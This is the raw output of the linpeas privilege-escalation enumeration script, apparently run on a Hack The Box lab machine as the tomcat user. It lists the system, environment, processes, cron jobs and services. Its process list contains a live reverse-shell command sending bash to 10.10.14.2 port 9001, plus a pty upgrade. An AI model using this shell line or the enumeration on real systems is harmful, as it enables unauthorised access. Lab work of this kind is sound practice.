

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

      /---------------------------------------------------------------------------\
      |                             Do you like PEASS?                            |                                 
      |---------------------------------------------------------------------------|                                 
      |         Become a Patreon    :     https://www.patreon.com/peass           |                                 
      |         Follow on Twitter   :     @carlospolopm                           |                                 
      |         Respect on HTB      :     SirBroccoli & makikvues                 |                                 
      |---------------------------------------------------------------------------|                                 
      |                                 Thank you!                                |                                 
      \---------------------------------------------------------------------------/                                 
        linpeas-ng by carlospolop                                                                                   
                                                                                                                    
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                                    
                                                                                                                    
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:                                                                                                            
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

════════════════════════════════════╣ Basic information ╠════════════════════════════════════
OS: Linux version 5.4.0-31-generic (buildd@lgw01-amd64-059) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020
User & Groups: uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
Hostname: tabby
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                       
                                                                                                                    

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
uniq: write error: Broken pipe
DONE
                                                                                                                    
════════════════════════════════════╣ System Information ╠════════════════════════════════════
╔══════════╣ Operative system                                                                                       
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                       
Linux version 5.4.0-31-generic (buildd@lgw01-amd64-059) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020
Distributor ID: Ubuntu
Description:    Ubuntu 20.04 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                          
Sudo version 1.8.31                                                                                                 

╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                                                                                              
                                                                                                                    
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                  
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin:/snap/bin:/var/lib/snapd/snap/bin:/snap/bin:/var/lib/snapd/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin:/snap/bin:/var/lib/snapd/snap/bin:/snap/bin:/var/lib/snapd/snap/bin

╔══════════╣ Date & uptime
Sat 14 Aug 2021 04:03:46 AM UTC                                                                                     
 04:03:46 up  4:49,  0 users,  load average: 0.22, 0.05, 0.02

╔══════════╣ System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                    
/dev/sda2        16G  5.4G  9.6G  36% /
udev            952M     0  952M   0% /dev
tmpfs           994M  448K  994M   1% /dev/shm
tmpfs           199M  1.1M  198M   1% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           994M     0  994M   0% /sys/fs/cgroup
/dev/loop0       55M   55M     0 100% /snap/core18/1705
/dev/loop1       69M   69M     0 100% /snap/lxd/14804
/dev/loop2       28M   28M     0 100% /snap/snapd/7264
              total        used        free      shared  buff/cache   available
Mem:        2035224      358264      957460        4012      719500     1480688
Swap:       2097148           0     2097148

╔══════════╣ CPU info
Architecture:                    x86_64                                                                             
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
Address sizes:                   43 bits physical, 48 bits virtual
CPU(s):                          2
On-line CPU(s) list:             0,1
Thread(s) per core:              1
Core(s) per socket:              1
Socket(s):                       2
NUMA node(s):                    1
Vendor ID:                       GenuineIntel
CPU family:                      6
Model:                           79
Model name:                      Intel(R) Xeon(R) CPU E5-2683 v4 @ 2.10GHz
Stepping:                        1
CPU MHz:                         2099.998
BogoMIPS:                        4199.99
Hypervisor vendor:               VMware
Virtualization type:             full
L1d cache:                       64 KiB
L1i cache:                       64 KiB
L2 cache:                        512 KiB
L3 cache:                        80 MiB
NUMA node0 CPU(s):               0,1
Vulnerability Itlb multihit:     KVM: Vulnerable
Vulnerability L1tf:              Mitigation; PTE Inversion
Vulnerability Mds:               Mitigation; Clear CPU buffers; SMT Host state u
                                 nknown
Vulnerability Meltdown:          Mitigation; PTI
Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled v
                                 ia prctl and seccomp
Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user
                                  pointer sanitization
Vulnerability Spectre v2:        Mitigation; Full generic retpoline, IBPB condit
                                 ional, IBRS_FW, STIBP disabled, RSB filling
Vulnerability Tsx async abort:   Not affected
Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtr
                                 r pge mca cmov pat pse36 clflush mmx fxsr sse s
                                 se2 ss syscall nx pdpe1gb rdtscp lm constant_ts
                                 c arch_perfmon nopl xtopology tsc_reliable nons
                                 top_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid
                                  sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline
                                 _timer aes xsave avx f16c rdrand hypervisor lah
                                 f_lm abm 3dnowprefetch cpuid_fault invpcid_sing
                                 le pti ssbd ibrs ibpb stibp fsgsbase tsc_adjust
                                  bmi1 avx2 smep bmi2 invpcid rdseed adx smap xs
                                 aveopt arat md_clear flush_l1d arch_capabilitie
                                 s

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                             
HISTSIZE=0                                                                                                          
JAVA_HOME=/usr/lib/jvm/default-java
JAVA_OPTS=-Djava.awt.headless=true -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
PWD=/dev/shm
LOGNAME=tomcat
HOME=/opt/tomcat
LANG=en_US.UTF-8
HISTFILE=/dev/null
LS_COLORS=
INVOCATION_ID=ec30ea61329f4febb4a9e56b92ce0735
CATALINA_BASE=/var/lib/tomcat9
LESSCLOSE=/usr/bin/lesspipe %s %s
CATALINA_HOME=/usr/share/tomcat9
LESSOPEN=| /usr/bin/lesspipe %s
USER=tomcat
SHLVL=5
JDK_JAVA_OPTIONS= --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
CATALINA_TMPDIR=/tmp
JOURNAL_STREAM=9:23482
CACHE_DIRECTORY=/var/cache/tomcat9
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin:/snap/bin:/var/lib/snapd/snap/bin:/snap/bin:/var/lib/snapd/snap/bin
HISTFILESIZE=0
OLDPWD=/home
_=/usr/bin/env

╔══════════╣ Searching Signature verification failed in dmseg
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                   
dmesg Not Found                                                                                                     
                                                                                                                    
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                       
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                   
═╣ Execshield enabled? ............ Execshield Not Found                                                            
═╣ SELinux enabled? ............... sestatus Not Found                                                              
═╣ Is ASLR enabled? ............... Yes                                                                             
═╣ Printer? ....................... lpstat Not Found
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                    

════════════════════════════════════╣ Containers ╠════════════════════════════════════
╔══════════╣ Container related tools present                                                                        
╔══════════╣ Container details                                                                                      
═╣ Is this a container? ........... No                                                                              
═╣ Any running containers? ........ No                                                                              
                                                                                                                    
════════════════════════════════════╣ Devices ╠════════════════════════════════════
╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)                                                                 
disk                                                                                                                
sda
sda1
sda2

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                           
/dev/disk/by-uuid/0aadaa55-9138-4c0d-b1dc-fe8a382110f0 / ext4 defaults 0 0                                          
/swap.img       none    swap    sw      0       0

╔══════════╣ Mounted disks information
diskutil Not Found                                                                                                  
                                                                                                                    
╔══════════╣ Mounted SMB Shares
smbutil Not Found                                                                                                   
                                                                                                                    

════════════════════════════════════╣ Available Software ╠════════════════════════════════════
╔══════════╣ Useful software                                                                                        
/usr/bin/nc                                                                                                         
/usr/bin/netcat
/usr/bin/wget
/usr/bin/curl
/usr/bin/ping
/usr/bin/base64
/usr/bin/python3
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo

╔══════════╣ Installed Compiler
/snap/core18/1705/usr/share/gcc-8                                                                                   
/usr/share/gcc-10
/usr/share/bash-completion/completions/gcc-5
/usr/share/bash-completion/completions/gcc-6
/usr/share/bash-completion/completions/gcc-7
/usr/share/bash-completion/completions/gcc-8


════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════                                                                                                                 
╔══════════╣ Cleaned processes                                                                                      
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                  
root           1  0.0  0.5 169652 11652 ?        Ss   Aug13   0:03 /sbin/init maybe-ubiquity                        
root         440  0.0  1.4  68012 28820 ?        S<s  Aug13   0:06 /lib/systemd/systemd-journald
root         469  0.0  0.2  21304  5408 ?        Ss   Aug13   0:01 /lib/systemd/systemd-udevd
root         620  0.0  0.8 345860 18260 ?        SLsl Aug13   0:10 /sbin/multipathd -d -s
systemd+     647  0.0  0.3  90388  6372 ?        Ssl  Aug13   0:04 /lib/systemd/systemd-timesyncd
root         655  0.0  0.5  47524 10304 ?        Ss   Aug13   0:00 /usr/bin/VGAuthService
root         656  0.1  0.3 161980  8012 ?        S<sl Aug13   0:20 /usr/bin/vmtoolsd
systemd+     733  0.0  0.3  18544  7716 ?        Ss   Aug13   0:00 /lib/systemd/systemd-networkd
systemd+     795  0.0  0.5  24048 12120 ?        Ss   Aug13   0:03 /lib/systemd/systemd-resolved
root         808  0.0  0.3 235548  7396 ?        Ssl  Aug13   0:01 /usr/lib/accountsservice/accounts-daemon
root         813  0.0  0.1   6812  3052 ?        Ss   Aug13   0:00 /usr/sbin/cron -f
message+     817  0.0  0.2   7616  4628 ?        Ss   Aug13   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         836  0.0  0.1  81944  3588 ?        Ssl  Aug13   0:00 /usr/sbin/irqbalance --foreground
root         838  0.0  0.8  29020 18132 ?        Ss   Aug13   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog       846  0.0  0.2 224324  4920 ?        Ssl  Aug13   0:01 /usr/sbin/rsyslogd -n -iNONE
root         853  0.0  1.4 866756 29492 ?        Ssl  Aug13   0:01 /usr/lib/snapd/snapd
root         856  0.0  0.3  16724  7640 ?        Ss   Aug13   0:00 /lib/systemd/systemd-logind
daemon[0m       879  0.0  0.1   3792  2184 ?        Ss   Aug13   0:00 /usr/sbin/atd -f
root         894  0.0  0.9 193588 18500 ?        Ss   Aug13   0:01 /usr/sbin/apache2 -k start
www-data    2522  0.0  0.6 194288 12624 ?        S    00:00   0:00  _ /usr/sbin/apache2 -k start
www-data    2523  0.0  0.6 194016 12628 ?        S    00:00   0:00  _ /usr/sbin/apache2 -k start
www-data    2524  0.0  0.6 194304 12968 ?        S    00:00   0:00  _ /usr/sbin/apache2 -k start
www-data    2525  0.0  0.6 194288 13792 ?        S    00:00   0:00  _ /usr/sbin/apache2 -k start
www-data    2526  0.0  0.6 194288 12624 ?        S    00:00   0:00  _ /usr/sbin/apache2 -k start
www-data    2978  0.0  0.3 193976  8108 ?        S    00:11   0:00  _ /usr/sbin/apache2 -k start
tomcat       950  0.5 10.2 3096020 208936 ?      Ssl  Aug13   1:32 /usr/lib/jvm/default-java/bin/java -Djava.util.logging.config.file=/var/lib/tomcat9/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.awt.headless=true -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/share/tomcat9/bin/bootstrap.jar:/usr/share/tomcat9/bin/tomcat-juli.jar -Dcatalina.base=/var/lib/tomcat9 -Dcatalina.home=/usr/share/tomcat9 -Djava.io.tmpdir=/tmp org.apache.catalina.startup.Bootstrap start
tomcat      9101  0.0  0.1   6972  3300 ?        S    03:56   0:00  _ bash /tmp/rev.sh
tomcat      9102  0.0  0.1   6972  3476 ?        S    03:56   0:00      _ bash -c bash -i >& /dev/tcp/10.10.14.2/9001 0>&1
tomcat      9103  0.0  0.2   8316  5196 ?        S    03:56   0:00          _ bash -i
tomcat      9174  0.0  0.4  15836 10028 ?        S    03:59   0:00              _ python3 -c import pty; pty.spawn("/bin/bash");
tomcat      9175  0.0  0.2   8432  5376 pts/0    Ss   03:59   0:00                  _ /bin/bash
tomcat      9324  1.1  0.2   7960  4612 pts/0    S+   04:03   0:00                      _ bash linpeas.sh
tomcat     10406  0.0  0.1   7960  2496 pts/0    S+   04:03   0:00                          _ bash linpeas.sh
tomcat     10409  0.0  0.1   9028  3300 pts/0    R+   04:03   0:00                          |   _ ps fauxwww
tomcat     10410  0.0  0.0   7960  1356 pts/0    S+   04:03   0:00                          _ bash linpeas.sh
root         984  0.0  0.0   5828  1800 tty1     Ss+  Aug13   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         996  0.0  0.3 232700  7000 ?        Ssl  Aug13   0:00 /usr/lib/policykit-1/polkitd --no-debug
root        1084  0.0  1.0 107836 20972 ?        Ssl  Aug13   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root        6121  0.0  1.1 373940 22692 ?        Ssl  02:09   0:00 /usr/libexec/fwupd/fwupd

╔══════════╣ Binary processes permissions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                             
-rwxr-xr-x 1 root root  1183448 Feb 25  2020 /bin/bash                                                              
-rwxr-xr-x 1 root root   157776 Apr 22  2020 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   264328 Apr 22  2020 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root  2216800 Apr 22  2020 /lib/systemd/systemd-networkd
-rwxr-xr-x 1 root root   403520 Apr 22  2020 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root root    55360 Apr 22  2020 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   735664 Apr 22  2020 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    69000 Apr  2  2020 /sbin/agetty
lrwxrwxrwx 1 root root       20 Apr 22  2020 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   129224 Apr  6  2020 /sbin/multipathd
-rwxr-xr-x 1 root root   249032 Dec  7  2019 /usr/bin/dbus-daemon[0m
lrwxrwxrwx 1 root root        9 Mar 13  2020 /usr/bin/python3 -> python3.8
-rwxr-xr-x 1 root root   141696 Mar  9  2020 /usr/bin/VGAuthService
-rwxr-xr-x 1 root root    63904 Mar  9  2020 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root   203192 Mar 30  2020 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root   260616 Apr  1  2020 /usr/libexec/fwupd/fwupd
-rwxr-xr-x 1 root root    14560 Apr 16  2020 /usr/lib/jvm/default-java/bin/java
-rwxr-xr-x 1 root root   121504 Aug 16  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root 24158608 Apr 10  2020 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root   704520 Apr 13  2020 /usr/sbin/apache2
-rwxr-xr-x 1 root root    30728 Nov 12  2018 /usr/sbin/atd
-rwxr-xr-x 1 root root    55944 Feb 13  2020 /usr/sbin/cron
-rwxr-xr-x 1 root root    64432 Feb 13  2020 /usr/sbin/irqbalance
-rwxr-xr-x 1 root root   727248 Feb 11  2020 /usr/sbin/rsyslogd

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                  
COMMAND     PID  TID TASKCMD               USER   FD      TYPE             DEVICE  SIZE/OFF   NODE NAME             

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                       
gdm-password Not Found                                                                                              
gnome-keyring-daemon Not Found                                                                                      
lightdm Not Found                                                                                                   
vsftpd Not Found                                                                                                    
apache2 process found (dump creds from memory as root)                                                              
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                   
/usr/bin/crontab                                                                                                    
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

incrontab Not Found
-rw-r--r-- 1 root root    1040 May 21  2020 /etc/crontab                                                            

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 May 21  2020 .
drwxr-xr-x 101 root root 4096 Jun 17  2020 ..
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  191 Apr 23  2020 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x   2 root root 4096 May 21  2020 .
drwxr-xr-x 101 root root 4096 Jun 17  2020 ..
-rwxr-xr-x   1 root root  539 Apr 13  2020 apache2
-rwxr-xr-x   1 root root  376 Dec  4  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x   1 root root  543 Jul 16  2019 mlocate
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root  538 Feb 24  2020 tomcat9
-rwxr-xr-x   1 root root  214 Apr  2  2020 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Apr 23  2020 .
drwxr-xr-x 101 root root 4096 Jun 17  2020 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Apr 23  2020 .
drwxr-xr-x 101 root root 4096 Jun 17  2020 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Apr 23  2020 .
drwxr-xr-x 101 root root 4096 Jun 17  2020 ..
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  211 Apr  2  2020 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command


╔══════════╣ Services
╚ Search for outdated versions                                                                                      
 [ - ]  apache-htcacheclean                                                                                         
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  grub-common
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ - ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ - ]  lvm2-lvmpolld
 [ + ]  multipath-tools
 [ + ]  networking
 [ - ]  open-iscsi
 [ + ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd
 [ - ]  x11-common

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                           
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                         

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                              
You can't write on systemd PATH                                                                                     

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                
NEXT                        LEFT           LAST                        PASSED               UNIT                         ACTIVATES                     
Sat 2021-08-14 04:09:00 UTC 5min left      Sat 2021-08-14 03:39:08 UTC 24min ago            phpsessionclean.timer        phpsessionclean.service       
Sat 2021-08-14 06:03:01 UTC 1h 59min left  Sat 2021-08-14 02:09:23 UTC 1h 54min ago         fwupd-refresh.timer          fwupd-refresh.service         
Sat 2021-08-14 06:44:54 UTC 2h 41min left  Sat 2021-08-14 00:05:29 UTC 3h 58min ago         apt-daily-upgrade.timer      apt-daily-upgrade.service     
Sat 2021-08-14 08:48:27 UTC 4h 44min left  Tue 2020-06-16 10:00:06 UTC 1 years 1 months ago apt-daily.timer              apt-daily.service             
Sat 2021-08-14 18:31:15 UTC 14h left       Sat 2021-08-14 01:34:06 UTC 2h 29min ago         motd-news.timer              motd-news.service             
Sat 2021-08-14 23:29:28 UTC 19h left       Fri 2021-08-13 23:29:28 UTC 4h 34min ago         systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service                                                                                 
Sun 2021-08-15 00:00:00 UTC 19h left       Sat 2021-08-14 00:00:19 UTC 4h 3min ago          logrotate.timer              logrotate.service             
Sun 2021-08-15 00:00:00 UTC 19h left       Sat 2021-08-14 00:00:19 UTC 4h 3min ago          man-db.timer                 man-db.service                
Sun 2021-08-15 03:10:45 UTC 23h left       Fri 2021-08-13 23:14:31 UTC 4h 49min ago         e2scrub_all.timer            e2scrub_all.service           
Mon 2021-08-16 00:00:00 UTC 1 day 19h left Fri 2021-08-13 23:14:25 UTC 4h 49min ago         fstrim.timer                 fstrim.service                
n/a                         n/a            n/a                         n/a                  snapd.snap-repair.timer      snapd.snap-repair.service     

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                
                                                                                                                    
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                               
                                                                                                                    
╔══════════╣ HTTP sockets
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                               
                                                                                                                    
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                 
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                 
NAME                            PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION
:1.0                            733 systemd-network systemd-network  :1.0          systemd-networkd.service    -       -
:1.1                            647 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service   -       -
:1.12                          6121 fwupd           root             :1.12         fwupd.service               -       -
:1.127                        13562 busctl          tomcat           :1.127        tomcat9.service             -       -
:1.2                            795 systemd-resolve systemd-resolve  :1.2          systemd-resolved.service    -       -
:1.4                            808 accounts-daemon root             :1.4          accounts-daemon.service     -       -
:1.5                              1 systemd         root             :1.5          init.scope                  -       -
:1.6                            996 polkitd         root             :1.6          polkit.service              -       -
:1.7                            838 networkd-dispat root             :1.7          networkd-dispatcher.service -       -
:1.8                            856 systemd-logind  root             :1.8          systemd-logind.service      -       -
:1.9                           1084 unattended-upgr root             :1.9          unattended-upgrades.service -       -
com.ubuntu.LanguageSelector       - -               -                (activatable) -                           -       -
com.ubuntu.SoftwareProperties     - -               -                (activatable) -                           -       -
io.netplan.Netplan                - -               -                (activatable) -                           -       -
org.freedesktop.Accounts        808 accounts-daemon root             :1.4          accounts-daemon.service     -       -
org.freedesktop.DBus              1 systemd         root             -             init.scope                  -       -
org.freedesktop.PackageKit        - -               -                (activatable) -                           -       -
org.freedesktop.PolicyKit1      996 polkitd         root             :1.6          polkit.service              -       -
org.freedesktop.bolt              - -               -                (activatable) -                           -       -
org.freedesktop.fwupd          6121 fwupd           root             :1.12         fwupd.service               -       -
org.freedesktop.hostname1         - -               -                (activatable) -                           -       -
org.freedesktop.locale1           - -               -                (activatable) -                           -       -
org.freedesktop.login1          856 systemd-logind  root             :1.8          systemd-logind.service      -       -
org.freedesktop.network1        733 systemd-network systemd-network  :1.0          systemd-networkd.service    -       -
org.freedesktop.resolve1        795 systemd-resolve systemd-resolve  :1.2          systemd-resolved.service    -       -
org.freedesktop.systemd1          1 systemd         root             :1.5          init.scope                  -       -
org.freedesktop.thermald          - -               -                (activatable) -                           -       -
org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
